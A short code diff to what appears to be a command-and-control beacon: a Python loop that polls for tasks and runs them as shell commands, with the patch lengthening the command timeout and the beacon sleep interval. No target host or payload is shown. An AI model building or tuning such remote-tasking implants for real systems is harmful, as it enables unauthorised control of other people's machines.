@@ -48,7 +48,7 @@ def execute_task(task):
         output = False
     start_time = round(datetime.timestamp(datetime.now()))
     try:
-        process = subprocess.run(command, capture_output=output, timeout=15)
+        process = subprocess.run(command, capture_output=output, timeout=40)
         if process.returncode != 0:
             print("[!] error")
             # std error
@@ -70,7 +70,7 @@ def beacon_loop():
     print("Starting beacon loop")
     success = True
     while True:
-        time.sleep(20)
+        time.sleep(30)
         print("Looping")
         # 1. Fetch next task
         task = fetch_next_task()
